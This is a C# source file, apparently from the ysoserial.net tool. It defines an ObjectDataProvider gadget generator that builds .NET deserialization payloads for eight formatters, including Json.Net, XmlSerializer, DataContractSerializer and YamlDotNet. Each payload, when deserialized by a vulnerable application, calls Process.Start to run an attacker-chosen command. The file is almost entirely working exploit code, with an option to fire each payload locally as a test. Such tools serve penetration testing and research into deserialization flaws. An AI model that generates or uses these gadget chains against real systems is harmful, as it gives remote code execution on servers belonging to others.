using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.Serialization;
using fastJSON;
using Newtonsoft.Json;
using System.Web.Script.Serialization;
using System.Xml;
using System.Xml.Serialization;
using YamlDotNet.Serialization;
using System.Windows.Markup;
using System.Diagnostics;
using System.Windows.Data;
using System.Reflection;
using System.Collections.Specialized;

namespace ysoserial.Generators
{
    class ObjectDataProviderGenerator : GenericGenerator
    {
        public override string Description()
        {
            return "ObjectDataProvider gadget";
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "Xaml", "Json.Net", "FastJson", "JavaScriptSerializer", "XmlSerializer", "DataContractSerializer", "YamlDotNet < 5.0.0", "FsPickler" };
        }

        public override string Name()
        {
            return "ObjectDataProvider";
        }

        public override string Credit()
        {
            return "Oleksandr Mirosh and Alvaro Munoz";
        }

        public override object Generate(string cmd, string formatter, Boolean test, Boolean minify)
        {
            if (formatter.ToLower().Equals("xaml"))
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                Boolean hasArgs;
                string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, out hasArgs);
                psi.FileName = splittedCMD[0];
                if (hasArgs)
                {
                    psi.Arguments = splittedCMD[1];
                }
                StringDictionary dict = new StringDictionary();
                psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);
                Process p = new Process();
                p.StartInfo = psi;
                ObjectDataProvider odp = new ObjectDataProvider();
                odp.MethodName = "Start";
                odp.IsInitialLoadEnabled = false;
                odp.ObjectInstance = p;

                string payload = XamlWriter.Save(odp);

                if (minify)
                {
                    // using discardable regex array to make it shorter!
                    payload = Helpers.XMLMinifier.Minify(payload, null, new String[] { @"StandardErrorEncoding=.*LoadUserProfile=""False"" ", @"IsInitialLoadEnabled=""False"" " });
                }

                if (test)
                {
                    try
                    {
                        StringReader stringReader = new StringReader(payload);
                        XmlReader xmlReader = XmlReader.Create(stringReader);
                        XamlReader.Load(xmlReader);
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            if (formatter.ToLower().Equals("json.net"))
            {
                Boolean hasArgs;
                string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.JSON, out hasArgs);

                if (hasArgs)
                {
                    cmd = "'" + splittedCMD[0] + "', '" + splittedCMD[1] + "'";
                }
                else
                {
                    cmd = "'" + splittedCMD[0] + "'";
                }

                String payload = @"{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':[" + cmd + @"]
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}";
                if (minify)
                {
                    payload = Helpers.JSONMinifier.Minify(payload, new String[] { "PresentationFramework", "mscorlib", "System" }, null);
                }

                if (test)
                {
                    try
                    {
                        Object obj = JsonConvert.DeserializeObject<Object>(payload, new JsonSerializerSettings
                        {
                            TypeNameHandling = TypeNameHandling.Auto
                        }); ;
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("fastjson"))
            {
                Boolean hasArgs;
                string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.JSON, out hasArgs);

                String cmdPart;

                if (hasArgs)
                {
                    cmdPart = @"""FileName"":""" + splittedCMD[0] + @""",""Arguments"":""" + splittedCMD[1] + @"""";
                }
                else
                {
                    cmdPart = @"""FileName"":""" + splittedCMD[0] + @"""";
                }

                String payload = @"{
    ""$types"":{
        ""System.Windows.Data.ObjectDataProvider, PresentationFramework, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = 31bf3856ad364e35"":""1"",
        ""System.Diagnostics.Process, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"":""2"",
        ""System.Diagnostics.ProcessStartInfo, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"":""3""
    },
    ""$type"":""1"",
    ""ObjectInstance"":{
        ""$type"":""2"",
        ""StartInfo"":{
            ""$type"":""3"",
            " + cmdPart + @"
        }
    },
    ""MethodName"":""Start""
}";

                if (minify)
                {
                    payload = Helpers.JSONMinifier.Minify(payload, null, null);
                }

                if (test)
                {
                    try
                    {
                        var instance = JSON.ToObject<Object>(payload);

                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("javascriptserializer"))
            {
                Boolean hasArgs;
                string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.JSON, out hasArgs);

                String cmdPart;

                if (hasArgs)
                {
                    cmdPart = "'FileName':'" + splittedCMD[0] + "', 'Arguments':'" + splittedCMD[1] + "'";
                }
                else
                {
                    cmdPart = "'FileName':'" + splittedCMD[0] + "'";
                }

                String payload = @"{
    '__type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
    'MethodName':'Start',
    'ObjectInstance':{
        '__type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        'StartInfo': {
            '__type':'System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
            " + cmdPart + @"
        }
    }
}";

                if (minify)
                {
                    payload = Helpers.JSONMinifier.Minify(payload, null, null);
                }

                if (test)
                {
                    try
                    {
                        JavaScriptSerializer jss = new JavaScriptSerializer(new SimpleTypeResolver());
                        var json_req = jss.Deserialize<Object>(payload);
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("xmlserializer"))
            {

                Boolean hasArgs;
                string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.XML, out hasArgs);

                String cmdPart;

                if (hasArgs)
                {
                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{splittedCMD[0]}</b:String><b:String>{splittedCMD[1]}</b:String>";
                }
                else
                {
                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{splittedCMD[0]}</b:String>";
                }

                String payload = $@"<?xml version=""1.0""?>
<root type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
    <ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" >
        <ExpandedElement/>
        <ProjectedProperty0>
            <MethodName>Parse</MethodName>
            <MethodParameters>
                <anyType xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xsi:type=""xsd:string"">
                    <![CDATA[<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system""><ObjectDataProvider d:Key="""" ObjectType=""{{d:Type c:Process}}"" MethodName=""Start"">{cmdPart}</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
                </anyType>
            </MethodParameters>
            <ObjectInstance xsi:type=""XamlReader""></ObjectInstance>
        </ProjectedProperty0>
    </ExpandedWrapperOfXamlReaderObjectDataProvider>
</root>
";

                if (minify)
                {
                    payload = Helpers.XMLMinifier.Minify(payload, null, null);
                }


                if (test)
                {
                    try
                    {
                        var xmlDoc = new XmlDocument();
                        xmlDoc.LoadXml(payload);
                        XmlElement xmlItem = (XmlElement)xmlDoc.SelectSingleNode("root");
                        var s = new XmlSerializer(Type.GetType(xmlItem.GetAttribute("type")));
                        var d = s.Deserialize(new XmlTextReader(new StringReader(xmlItem.InnerXml)));
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("datacontractserializer"))
            {

                Boolean hasArgs;
                string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.XML, out hasArgs);

                String cmdPart;

                if (hasArgs)
                {
                    cmdPart = $@"<b:anyType i:type=""c:string"">" + splittedCMD[0] + @"</b:anyType>
          <b:anyType i:type=""c:string"">" + splittedCMD[1] + "</b:anyType>";
                }
                else
                {
                    cmdPart = $@"<b:anyType i:type=""c:string"" xmlns:c=""http://www.w3.org/2001/XMLSchema"">" + splittedCMD[0] + @"</b:anyType>";
                }

                String payload = $@"<?xml version=""1.0""?>
<root type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
    <ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL xmlns=""http://schemas.datacontract.org/2004/07/System.Data.Services.Internal"" 
                                                         xmlns:c=""http://www.w3.org/2001/XMLSchema""
                                                         xmlns:i=""http://www.w3.org/2001/XMLSchema-instance""
                                                         xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"">
      <ExpandedElement z:Id=""ref1"" xmlns:a=""http://schemas.datacontract.org/2004/07/System.Diagnostics"">
        <__identity i:nil=""true"" xmlns=""http://schemas.datacontract.org/2004/07/System""/>
      </ExpandedElement>
      <ProjectedProperty0 xmlns:a=""http://schemas.datacontract.org/2004/07/System.Windows.Data"">
        <a:MethodName>Start</a:MethodName>
        <a:MethodParameters xmlns:b=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"">
          " + cmdPart + @"
        </a:MethodParameters>
        <a:ObjectInstance z:Ref=""ref1""/>
      </ProjectedProperty0>
    </ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL>
</root>
";
                if (minify)
                {
                    payload = Helpers.XMLMinifier.Minify(payload, null, null, Helpers.FormatterType.DataContractXML);
                }

                if (test)
                {
                    try
                    {
                        var xmlDoc = new XmlDocument();
                        xmlDoc.LoadXml(payload);
                        XmlElement xmlItem = (XmlElement)xmlDoc.SelectSingleNode("root");
                        var s = new DataContractSerializer(Type.GetType(xmlItem.GetAttribute("type")));
                        var d = s.ReadObject(new XmlTextReader(new StringReader(xmlItem.InnerXml)));
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("yamldotnet"))
            {

                Boolean hasArgs;
                string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.YamlDotNet, out hasArgs);

                String cmdPart;

                if (hasArgs)
                {
                    cmdPart = $@"FileName: " + splittedCMD[0] + @",
					Arguments: " + splittedCMD[1];
                }
                else
                {
                    cmdPart = $@"FileName: " + splittedCMD[0];
                }

                String payload = @"
!<!System.Windows.Data.ObjectDataProvider,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35> {
    MethodName: Start,
	ObjectInstance: 
		!<!System.Diagnostics.Process,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089> {
			StartInfo:
				!<!System.Diagnostics.ProcessStartInfo,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089> {
					" + cmdPart + @"

                }
        }
}";
                if (minify)
                {
                    payload = Helpers.YamlDotNet.Minify(payload);
                }

                if (test)
                {
                    try
                    {
                        //to bypass all of the vulnerable version's type checking, we need to set up a stream
                        using (var reader = new StreamReader(new MemoryStream(System.Text.Encoding.UTF8.GetBytes(payload))))
                        {
                            var deserializer = new DeserializerBuilder().Build();
                            var result = deserializer.Deserialize(reader);
                        }
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("fspickler"))
            {
                Boolean hasArgs;
                string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.XML, out hasArgs);

                String cmdPart;

                if (hasArgs)
                {
                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{splittedCMD[0]}</b:String><b:String>{splittedCMD[1]}</b:String>";
                }
                else
                {
                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{splittedCMD[0]}</b:String>";
                }

                String internalPayload = @"<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system""><ObjectDataProvider d:Key="""" ObjectType=""{d:Type c:Process}"" MethodName=""Start"">" + cmdPart + @"</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>";

                internalPayload = Helpers.CommandArgSplitter.JsonString(internalPayload);

                String payload = @"{
  ""FsPickler"": ""4.0.0"",
  ""type"": ""System.Object"",
  ""value"": {
          ""_flags"": ""subtype"",
          ""subtype"": {
            ""Case"": ""NamedType"",
            ""Name"": ""Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties"",
            ""Assembly"": {
              ""Name"": ""Microsoft.PowerShell.Editor"",
              ""Version"": ""3.0.0.0"",
              ""Culture"": ""neutral"",
              ""PublicKeyToken"": ""31bf3856ad364e35""
            }
          },
          ""instance"": {
            ""serializationEntries"": [
              {
                ""Name"": ""ForegroundBrush"",
                ""Type"": {
                  ""Case"": ""NamedType"",
                  ""Name"": ""System.String"",
                  ""Assembly"": {
                    ""Name"": ""mscorlib"",
                    ""Version"": ""4.0.0.0"",
                    ""Culture"": ""neutral"",
                    ""PublicKeyToken"": ""b77a5c561934e089""
                  }
                },
                ""Value"": """+ internalPayload + @"""
              }
            ]
          }
    }
  }";

                if (minify)
                {
                    payload = Helpers.JSONMinifier.Minify(payload, null, null);
                }

                if (test)
                {
                    try
                    {
                        var serializer = MBrace.CsPickler.CsPickler.CreateJsonSerializer(true);
                        serializer.UnPickleOfString<Object>(payload);
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }
}
